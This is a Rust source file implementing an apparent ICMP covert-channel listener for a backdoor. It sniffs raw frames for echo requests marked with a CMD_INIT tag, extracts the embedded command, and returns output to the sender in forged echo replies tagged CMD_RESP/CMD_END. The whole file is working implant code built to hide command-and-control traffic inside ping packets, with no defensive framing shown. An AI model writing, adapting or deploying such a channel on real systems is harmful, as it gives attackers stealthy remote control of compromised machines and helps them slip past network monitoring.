use pnet::{
    datalink::{self, Channel::Ethernet, DataLinkReceiver, DataLinkSender, NetworkInterface},
    packet::{
        ethernet::{EtherType, EthernetPacket, MutableEthernetPacket},
        icmp::{IcmpPacket, IcmpType, MutableIcmpPacket},
        ip::IpNextHeaderProtocol,
        ipv4::{checksum, Ipv4Packet, MutableIpv4Packet},
        Packet,
    },
    util::MacAddr,
};
use std::{
    io::{Read, Write},
    net::Ipv4Addr,
};

use crate::vars::{CMD_END, CMD_INIT, CMD_RESP};

pub struct IcmpListener {
    tx: Box<dyn DataLinkSender>,
    rx: Box<dyn DataLinkReceiver>,
    ip_src: Ipv4Addr,
    ip_dst: Ipv4Addr,
    mac_src: MacAddr,
    mac_dst: MacAddr,
}

impl IcmpListener {
    pub fn new() -> IcmpListener {
        // Find the network interface with the provided name
        let prevent_loopback = |iface: &NetworkInterface| {
            for ipnet in &iface.ips {
                if ipnet.ip().is_loopback() {
                    return false;
                }
            }
            return true;
        };
        let interfaces = datalink::interfaces();
        let interface_vec: Vec<NetworkInterface> =
            interfaces.into_iter().filter(prevent_loopback).collect();
        let interface_name = get_interface(interface_vec);
        let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;
        let interfaces = datalink::interfaces();
        let interface = interfaces
            .into_iter()
            .filter(interface_names_match)
            .next()
            .unwrap();

        // Create a new channel, dealing with layer 2 packets
        let (tx, rx) = match datalink::channel(&interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };
        IcmpListener {
            tx,
            rx,
            ip_src: Ipv4Addr::LOCALHOST,
            ip_dst: Ipv4Addr::LOCALHOST,
            mac_src: MacAddr(0, 0, 0, 0, 0, 0),
            mac_dst: MacAddr(0, 0, 0, 0, 0, 0),
        }
    }
}

impl Read for IcmpListener {
    fn read(&mut self, buffer: &mut [u8]) -> Result<usize, std::io::Error> {
        loop {
            let packet = &self.rx.next()?;
            let eth_packet = match EthernetPacket::new(packet) {
                Some(x) => x,
                None => continue,
            };

            let ip_packet = match Ipv4Packet::new(eth_packet.payload()) {
                Some(x) => x,
                None => continue,
            };

            if ip_packet.get_next_level_protocol().0 == 1 {
                let source = format!("{}", ip_packet.get_destination());
                if cfg!(target_os = "freebsd") {
                    if &source[0..=2] != "192" {
                        continue;
                    }
                } else {
                    if &source[0..=1] != "10" {
                        continue;
                    }
                }

                let packet = match IcmpPacket::new(ip_packet.payload()) {
                    Some(x) => x,
                    None => continue,
                };
                let mut payload = packet.payload().to_vec();
                loop {
                    let byte = payload.get(0).unwrap();
                    if byte == &0 {
                        payload.remove(0);
                    } else {
                        break;
                    }
                }
                if packet.get_icmp_type().0 == 8 {
                    if payload.len() >= 5 {
                        if &payload[0..5] == CMD_INIT {
                            self.mac_src = eth_packet.get_source();
                            self.mac_dst = eth_packet.get_destination();
                            self.ip_src = ip_packet.get_source();
                            self.ip_dst = ip_packet.get_destination();
                            let cmd = &payload[5..];
                            let len = cmd.len();
                            for i in 0..len {
                                buffer[i] = cmd[i];
                            }
                            return Ok(len);
                        }
                    }
                }
            }
        }
    }
}
impl Write for IcmpListener {
    fn write(&mut self, data: &[u8]) -> Result<usize, std::io::Error> {
        let out = Vec::from(data);
        let chunks: Vec<&[u8]> = out.chunks(975).collect();
        // 20 Long
        for (i, chunk) in chunks.iter().enumerate() {
            let mut balls: Vec<u8> = Vec::from(*CMD_RESP);
            let mut c: Vec<u8> = Vec::from(*chunk);
            balls.append(&mut c);
            if i == chunks.len() - 1 {
                balls.append(&mut Vec::from(*CMD_END));
            }
            let mut buffer = [0; 1000];
            let mut new_icmp_packet = MutableIcmpPacket::new(&mut buffer).unwrap();
            new_icmp_packet.set_icmp_type(IcmpType::new(0));
            new_icmp_packet.set_payload(&balls);
            let mut buffer = [0; 1060];
            let mut new_ip_packet = MutableIpv4Packet::new(&mut buffer).unwrap();
            new_ip_packet.set_next_level_protocol(IpNextHeaderProtocol::new(1));
            new_ip_packet.set_version(4);
            new_ip_packet.set_ttl(255);
            new_ip_packet.set_flags(0);
            new_ip_packet.set_identification(1);
            new_ip_packet.set_fragment_offset(0);
            new_ip_packet.set_header_length(5);
            new_ip_packet.set_source(self.ip_dst);
            new_ip_packet.set_destination(self.ip_src);
            new_ip_packet
                .set_total_length((20 + new_icmp_packet.packet().len()).try_into().unwrap());
            new_ip_packet.set_payload(new_icmp_packet.packet());
            new_ip_packet.set_checksum(checksum(&new_ip_packet.to_immutable()));
            let mut buffer = [0; 1080];
            let mut new_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
            new_packet.set_source(self.mac_dst);
            new_packet.set_destination(self.mac_src);
            new_packet.set_ethertype(EtherType::new(0x0800));
            new_packet.set_payload(new_ip_packet.packet());

            let _ = &self.tx.send_to(&new_packet.packet(), None).unwrap();
        }
        return Ok(0);
    }

    fn flush(&mut self) -> Result<(), std::io::Error> {
        todo!()
    }
}

fn get_interface(interface_vec: Vec<NetworkInterface>) -> String {
    match interface_vec.len() {
        0 => "Chom".to_string(),
        1 => format!("{}", interface_vec.get(0).unwrap().name),
        x => {
            if x > 1 {
                for iface in &interface_vec {
                    for ipnetwork in &iface.ips {
                        let ip_addr = format!("{}", ipnetwork.ip());
                        if ip_addr.len() >= 3 {
                            if cfg!(target_os = "freebsd") {
                                if &ip_addr[0..=2] == "192" {
                                    return format!("{}", iface.name);
                                }
                            } else {
                                if &ip_addr[0..=2] == "10." {
                                    return format!("{}", iface.name);
                                }
                            }
                        }
                    }
                }
            }
            return format!("{}", interface_vec.get(0).unwrap().name);
        }
    }
}
